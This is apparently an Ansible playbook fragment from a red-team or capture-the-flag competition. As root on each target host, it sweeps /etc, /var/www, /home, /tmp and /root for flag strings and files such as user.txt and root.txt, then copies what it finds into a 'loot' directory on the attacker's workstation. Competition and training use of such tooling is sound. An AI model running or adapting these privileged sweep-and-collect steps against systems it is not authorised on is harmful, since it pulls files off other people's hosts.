---
- name: Create local loot directory
  delegate_to: localhost
  file:
    path: "{{ playbook_dir }}/loot/{{ inventory_hostname }}"
    state: directory
    mode: '0755'
  become: no

- name: Targeted Flag Extraction
  become: yes
  shell: |
    # 1. Search for the FLAG[...] string pattern
    grep -rEo "FLAG\[[^]]+\]" /etc /var/www /home /tmp 2>/dev/null || true
    # 2. Search for common competition flag files and cat their content
    find /root /home /var/www -name "*flag*" -o -name "user.txt" -o -name "root.txt" 2>/dev/null | xargs -I {} sh -c 'echo "{}: $(cat {})"' || true
  register: fs_matches
  failed_when: false
  changed_when: false

- name: Save findings to Red Team Workstation
  delegate_to: localhost
  copy:
    content: |
      === TARGETED FLAG REPORT: {{ inventory_hostname }} ===
      [FILE PATH : FLAG STRING]
      {{ fs_matches.stdout if fs_matches.stdout != "" else "No valid flags found." }}
    dest: "{{ playbook_dir }}/loot/{{ inventory_hostname }}/flags_report.txt"
  become: no

- name: LIVE FLAG ALERT
  debug:
    msg: 
      - "--- FLAGS DETECTED ON {{ inventory_hostname }} ---"
      - "{{ fs_matches.stdout_lines if fs_matches.stdout != '' else ['NO FLAGS FOUND IN SCANNED DIRECTORIES'] }}"
  # Removed the 'when' condition so you ALWAYS get a status update on your screen